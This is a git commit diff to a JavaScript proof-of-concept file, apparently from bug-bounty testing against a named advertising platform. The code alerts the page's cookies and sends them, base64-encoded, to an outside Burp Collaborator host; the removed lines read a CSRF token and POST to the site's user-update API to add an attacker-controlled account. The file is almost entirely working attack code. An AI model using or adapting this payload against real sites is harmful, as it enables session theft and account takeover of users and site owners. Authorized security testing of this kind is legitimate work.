01f57c99fb993f9794fc626317fab558eb326015
johnstonemees <51981550@qq.com>
2024-09-19 12:48:33 +0800

    Update poc.js

--- js/poc.js
+++ js/poc.js
@@ -1,7 +1,7 @@
 alert(document.cookie);
 alert(document.domain);
 function stealCookies(){
-  const url = 'https://bcrsweta3cja1n7ra673qlbvlmrdf93y.oastify.com/?cookies=' + btoa(document.cookie)
+  const url = 'https://kc0uextit85igfq9a8t1015ei5ovck.burpcollaborator.net/?cookies=' + btoa(document.cookie)
   const response = fetch(url)
 }
 
@@ -17,16 +17,3 @@ function getCookie(cname)
   return "";
 }
 stealCookies();
-
-const csrfToken = getCookie("csrftoken");
-const addNew = {name:'johnstone_attacker',email:'johnstone+attacker' + Math.floor(Math.random() * 1000) + '@wearehackerone.com',role_info_list:[{'type':2}],operator_type:1};
-// a POST request
-const response = fetch('https://www.pangleglobal.com/media/api/user/update', {
-  method: 'POST',
-  headers: {
-  'Content-Type': 'application/json; charset=utf-8',
-  'X-Csrf-Token':csrfToken
-  },
-  body: JSON.stringify(addNew),
-})
-console.log('status:', response.status) 
